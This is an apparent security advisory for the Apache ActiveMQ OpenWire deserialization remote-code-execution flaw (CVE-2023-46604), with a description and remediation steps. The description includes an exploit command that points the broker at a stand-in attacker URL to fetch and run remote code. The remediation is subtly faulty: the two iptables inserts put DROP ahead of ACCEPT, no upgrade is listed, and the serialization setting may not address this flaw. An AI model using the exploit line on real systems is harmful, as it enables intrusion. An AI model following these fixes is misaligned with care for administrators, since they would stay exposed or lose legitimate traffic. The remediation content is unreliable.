# ActiveMQ 5.17.5 — OpenWire Deserialization RCE (CVE-2023-46604)

## Severity
**Critical** (CVSS 10.0)

## CVE / CWE
- CVE-2023-46604
- CWE-502: Deserialization of Untrusted Data

## Description
Apache ActiveMQ 5.17.5 is vulnerable to remote code execution via the OpenWire
protocol on port 61616. The vulnerability exists in the OpenWire unmarshalling
code which processes `ExceptionResponse` packets. By sending a specially crafted
`ClassInfo` packet, an unauthenticated attacker can instruct the broker to
instantiate a `ClassPathXmlApplicationContext` object with an attacker-controlled
URL, causing the broker to fetch and execute a remote Spring XML configuration
file containing arbitrary Java bean definitions.

The attack requires no authentication and only network access to port 61616:

```
python3 exploit.py <target>:61616 http://attacker/poc.xml
```

Once the broker fetches `poc.xml`, it instantiates any beans defined within it,
achieving OS-level command execution as the `activemq` process user.

## Affected Service
- **Service:** Apache ActiveMQ Classic 5.17.5
- **Port:** 61616/TCP (OpenWire)
- **Vulnerable component:** OpenWire protocol handler, ExceptionResponse deserialization

## Vulnerable Configuration
- Default ActiveMQ install with no `SERIALIZABLE_PACKAGES` restriction
- Port 61616 accessible from untrusted networks
- No `maxFrameSize` limit on transport connectors

## Remediation Steps
1. Restrict deserialization to safe packages by setting the `ACTIVEMQ_OPTS`
   environment variable before starting the broker:
   ```
   export ACTIVEMQ_OPTS="-Dorg.apache.activemq.SERIALIZABLE_PACKAGES=java.lang,java.util,org.apache.activemq,org.fusesource.hawtbuf,com.thoughtworks.xstream.mapper"
   ```
   Add this line to `/opt/activemq/bin/env` so it persists across restarts.
2. Configure `wireFormat.maxFrameSize` on each transport connector in
   `conf/activemq.xml` to limit frame size and reduce attack surface:
   ```xml
   <transportConnector name="openwire"
       uri="tcp://0.0.0.0:61616?wireFormat.maxFrameSize=104857600"/>
   ```
3. Restrict access to port 61616 via iptables so only trusted broker IPs
   and application servers can reach the OpenWire port:
   ```
   iptables -I INPUT -p tcp --dport 61616 -s <trusted-cidr> -j ACCEPT
   iptables -I INPUT -p tcp --dport 61616 -j DROP
   ```
4. Enable ActiveMQ's built-in class filter by adding a `classpath.properties`
   or configuring `ObjectMessage` serialization policy in `activemq.xml`.
5. Verify the web console on port 8161 still responds after applying the
   changes above.
